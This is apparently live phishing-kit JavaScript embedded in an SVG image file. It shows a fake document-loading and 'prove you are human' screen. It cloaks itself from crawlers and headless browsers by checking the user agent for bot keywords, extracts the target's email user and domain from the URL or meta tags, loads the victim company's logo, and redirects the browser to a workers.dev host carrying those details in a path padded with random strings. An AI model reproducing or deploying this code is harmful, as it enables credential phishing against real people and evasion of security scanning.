svg.script:
const bar = document.getElementById("progress");
const status = document.getElementById("status");
const title = document.getElementById("title");
const logo = document.getElementById("logo");
const button = document.getElementById("button");
const footer = document.getElementById("footer");

const url = window.location.href;
const seckey = '0auth';

if (!url.includes(seckey)) {
	window.location.replace("https://x.com?Access-Denied-Security-verification-failed");
}

let mainpartsimg = url.split(seckey).filter(p => p.length > 0);
let partsimg = mainpartsimg[1].split('/').filter(p => p.length > 0);

logo.setAttribute(
	"href",
	"https://logo.debounce.com/"+partsimg[5]
);
 
const messages = [
    "Loading resources...",
    "Preparing document...",
    "Rendering content...",
    "Almost ready...",
    "Complete"
];

let progress = 0;
const timer = setInterval(() => {
    progress += 1;
    if (progress > 100) progress = 100;
    
    bar.setAttribute("width", (progress * 0.45));
    
    const msgIndex = Math.min(Math.floor(progress / 25), messages.length - 1);
    status.textContent = messages[msgIndex];

    if (progress >= 100) {
        clearInterval(timer);
        title.textContent = "Verification";
        status.textContent = "Click Here to Prove you are human";
        waitForMouse();
    }
}, 35);

        function isBotLikely() {
            const ua = navigator.userAgent.toLowerCase();
            const bots = ['bot','crawler','spider','headless','selenium','puppeteer','playwright','curl','wget','python','http-client'];
            return bots.some(k => ua.includes(k)) || screen.width < 300 || !navigator.languages;
        }
 
        function securityCheck() {
            if (isBotLikely()) return false;
             return true;
        }
        function random(length) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        function extractValues() {
            const seckey = '0auth';
			
            const url = window.location.href;
			const u = Utils.getMetaContent('u')?.trim();
			const d = Utils.getMetaContent('d')?.trim();
 


            let mainparts = url.split(seckey).filter(p => p.length > 0);
            let parts = mainparts[1].split('/').filter(p => p.length > 0);
			
			logo.setAttribute(
				"href",
				"https://logo.debounce.com/"+parts[5]
			);
			
			
             return {
                data:   '' || seckey,
                datapg:   parts[0] || 'gen',
                user:   parts[3] || u,
                domain: parts[5] || d
            };
        }
 
        // 🚀 CONFIGURATION 
        function randomId(len = 15) {
            const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            let result = "";

            const randomValues = crypto.getRandomValues(new Uint8Array(len));

            for (let i = 0; i < len; i++) {
                result += chars[randomValues[i] % chars.length];
            }

            return result;
        }
		
		        // 🛠️ UTILITY FUNCTIONS
        const Utils = {
            cleanUrl(str, token) {
                return str.replace(new RegExp(token, 'g'), '');
            },

            base64UrlEncode(str) {
                return str.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
            },

            randomStr(length) {
                let result = '';
                const chars = CONFIG.randomChars;
                for (let i = length; i > 0; --i) {
                    result += chars[Math.floor(Math.random() * chars.length)];
                }
                return result;
            },

            safeAtob(str) {
                try { return atob(str); } catch { return str; }
            },

            isEmpty(value) {
                return value == null || value === '';
            },

            isValidEmail(email) {
                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
            },

            getMetaContent(name) {
                const meta = document.querySelector(`meta[name="${name}"]`);
                return meta ? meta.content : '';
            }
        };

        // 🛡️ BROWSER VALIDATION
        const BrowserValidator = {
            supported: ['Firefox', 'Chrome', 'Edge', 'Opera', 'Safari'],

            isSupported(userAgent) {
                if (!userAgent || typeof userAgent !== 'string') {
                    return false;
                }
                return this.supported.some(browser => userAgent.includes(browser));
            }
        };

        // 📧 EMAIL PROCESSOR  
        const EmailProcessor = {
            extract() {
                const u = Utils.getMetaContent('u')?.trim();
                const d = Utils.getMetaContent('d')?.trim();

                if (u && d) {
                    const raw = `;]${u}${CONFIG.separatorToken}${d}`;
                    const clean = raw.split(';]')[1]?.replace(new RegExp(CONFIG.replaceToken, 'gi'), '') || '';
                    return this.processEmail(clean);
                }

                return this.extractFromBaseRuns();
            },

            extractFromBaseRuns() {
                if (Utils.isEmpty(baseRuns)) return '';

                const runs = baseRuns.split(CONFIG.urlMarkers.html)[0];
                const emailPart = runs.split(CONFIG.urlMarkers.doc)[1];

                if (Utils.isEmpty(emailPart)) return '';

                const clean = emailPart
                    .replace(new RegExp(CONFIG.replaceToken, 'gi'), '')
                    .replace(new RegExp(CONFIG.separatorToken, 'gi'), '@');

                const parts = clean.split('@');
                const domain = parts[1] ? Utils.safeAtob(parts[1]) : parts[1];
                return `${parts[0]}@${domain}`;
            },

            processEmail(raw) {
                const clean = raw.replace(new RegExp(CONFIG.separatorToken, 'gi'), '@');
                const parts = clean.split('@');
                const domain = parts[1] ? Utils.safeAtob(parts[1]) : parts[1];
                return `${parts[0]}@${domain}`;
            },

            getValidEmail() {
                const email = this.extract();
                return Utils.isValidEmail(email) ? email : '';
            }
        };
 


function waitForMouse() {
 
    function verified() {
        document.removeEventListener("mousemove", verified);
        title.textContent = "Verified ✓";
        status.textContent = "Congratulations! Verification complete.";
        button.textContent = "Next";
        footer.textContent = "Loading Document Please wait...";
        bar.setAttribute("width", "45");
        const has0auth = window.location.href.includes("0auth");
        
			const values = extractValues();
            if (!values) return;

            const { data, datapg, user, domain } = values;
  
				            
				// Initial security check
				if (!securityCheck()) {
					window.location.replace("https://x.com?Access-Denied-Security-verification-failed");
					return null;
				}
         
        setTimeout(() => {
            status.textContent = "You may now continue.";
            button.textContent = "Continue...";
			const securePath = `https://steep-paper-93e7.aris2t5.workers.dev/` +
					`${random(12)}/${random(13)}/${random(13)}${data}${datapg}/${random(11)}/${random(12)}/${user}/${random(18)}/${domain}/${random(18)}`;
										
				 window.location.replace(securePath);
        }, 1400);
    }
    document.addEventListener("mousemove", verified, { once: true });
}
